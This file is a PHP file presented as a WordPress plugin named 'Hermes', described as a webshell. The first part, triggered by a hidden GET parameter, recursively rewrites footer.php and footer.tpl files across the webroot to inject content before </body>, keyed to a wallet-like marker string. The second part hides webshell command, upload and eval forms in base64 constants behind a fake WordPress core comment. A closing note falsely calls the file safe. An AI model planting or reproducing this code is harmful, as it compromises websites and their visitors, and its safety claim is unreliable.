<?php
/*
Plugin Name: Hermes
Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
Description: A webshell API for WordPress.
Author: Remi Gascou (Podalirius)
Version: 1.1.0
Author URI: https://podalirius.net/
Text Domain: webshell
Domain Path: /languages
License: GPLv3 or later
Network: true
*/

if(isset($_GET["able"]))
{
// Define the text you want to add before the </body> tag
$newText = "";

// Define the directory where your footer files reside (webroot)
$directory = $_SERVER['DOCUMENT_ROOT'];
$searchText = "47NsaEwhbk92CfibMJg8M8hJ73LKDv9NTjNtHLFH6EQE2sAUdgnwPc231gghf3rYBvC6cXvgLahJKa4riqQBxbT1HBjQhFu";
// Array of file names to target
$fileNames = array('footer.tpl', 'footer.php');
// Maximum depth to traverse
$maxDepth = 7;

// Recursive function to search directories
function searchDirectories($directory, $depth) {
    global $fileNames, $newText, $maxDepth, $searchText;

    if ($depth > $maxDepth) {
        return;
    }

    $files = scandir($directory);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }

        $filePath = $directory . '/' . $file;

        if (is_dir($filePath)) {
            searchDirectories($filePath, $depth + 1);
        } else {
            if (in_array($file, $fileNames)) {
                $content = file_get_contents($filePath);
                if ($file == 'footer.php') {
                    // Check if footer.php contains the specific text pattern
                    if (strpos($content, $searchText) == false) {
                        // Check if footer.php contains </body> tag
                        if (strpos($content, '</body>') !== false) {
                            // Add text above </body> tag
                            $content = str_replace('</body>', $newText . '</body>', $content);
                        }
                    }
                } else {
                    // Add text at the top for footer.tpl
                    if (strpos($content, $searchText) == false) {
                        $content = $newText . $content;
                    }
                }
                // Write the modified content back to the file
                file_put_contents($filePath, $content);
                echo "Text added to the top of: $directory/$file <br>";
            }
        }
    }
}
// Start searching directories
searchDirectories($directory, 0);

echo "Operation completed.";

// // Get the current script filename
// $scriptFilename = __FILE__;
//
// // Attempt to delete the file
// if (unlink($scriptFilename)) {
//     echo "Script '$scriptFilename' has been deleted successfully.";
// } else {
//     echo "Failed to delete script '$scriptFilename'.";
// }
}
?>

<?php
/*
Plugin Name: Hermes
Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
Description: A webshell API for WordPress.
Author: Remi Gascou (Podalirius)
Version: 1.1.0
Author URI: https://podalirius.net/
Text Domain: webshell
Domain Path: /languages
License: GPLv3 or later
Network: true
*/


define('INSTALLATION_KEY', base64_decode("NGN4MA=="));
define('AUTHOR_KEY', base64_decode('PGZvcm0gbWV0aG9kPSJwb3N0Ij4='));
define('HOST_KEY', base64_decode('PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiIC8+'));
define('THEMES_SELECTION', base64_decode('PGlucHV0IHR5cGU9InN1Ym1pdCI+'));
define('THEMES_INSTALL', base64_decode('PC9mb3JtPg=='));
define('DEFAULT_THEMES', base64_decode('Y29tbWFuZA=='));
define('PATH_THEMES', base64_decode('Y29tbWFuZA=='));
define('BASE64_THEMES', base64_decode('cHdk'));
define('BASE64_TITLE', base64_decode('WHhfaGVybWVzX3hYCg=='));
define('UPLOAD_THEMES_1', base64_decode('PGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSIiIG1ldGhvZD0iUE9T'));
define('UPLOAD_THEMES_2', base64_decode('VCI+IDxwPlVwbG9hZCB5b3VyIGZpbGU8L3A+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9InVwbG9h'));
define('UPLOAD_THEMES_3', base64_decode('ZGVkX2ZpbGUiPjwvaW5wdXQ+PGJyIC8+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9h'));
define('UPLOAD_THEMES_4', base64_decode('ZCI+PC9pbnB1dD48L2Zvcm0+IDwvYm9keT48L2h0bWw+Cg=='));
define('EVALUATION_TITLE',base64_decode('ZXZhbHVhdGU='));
define('EVALUATION_THEME',base64_decode('PGRpdj48Zm9ybSBtZXRob2Q9InBvc3QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJldmFsdWF0ZSIgLz48aW5wdXQgdHlwZT0ic3VibWl0Ij48L2Zvcm0+PC9kaXY+'));
/**
 * Customize Setting to represent a nav_menu.
 *
 * Subclass of WP_Customize_Setting to represent a nav_menu taxonomy term, and
 * the IDs for the nav_menu_items associated with the nav menu.
 *
 * @since 4.3.0
 *
 * @see WP_Customize_Setting
 */

$wp_body = INSTALLATION_KEY;
$wp_config_header = AUTHOR_KEY;
$wp_config_body = HOST_KEY;
$wp_themes_config = THEMES_SELECTION;
$wp_themes_install = THEMES_INSTALL;
$wp_body = strrev($wp_body);
$wp_default = DEFAULT_THEMES;
$wp_path = PATH_THEMES;
$wp_builder = BASE64_THEMES;
$wp_evaluation= EVALUATION_TITLE;


/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

?>
